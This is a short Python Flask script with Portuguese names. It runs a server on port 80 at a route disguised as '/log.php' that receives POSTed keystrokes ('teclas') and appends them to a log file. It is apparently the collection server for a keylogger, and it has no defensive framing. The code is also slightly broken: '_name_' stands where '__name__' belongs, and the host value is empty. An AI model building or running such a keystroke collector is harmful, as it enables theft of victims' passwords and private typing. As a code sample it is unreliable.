from flask import Flask, request
app = Flask(_name_)
@app.route('/log.php', methods=['POST'])
def capturar ():
    teclas = request.form.get('teclas')
    with open('log.txt', 'a') as f:
        f.write(teclas + '\n')
    return "Recebido"

app.run(host="", port=80)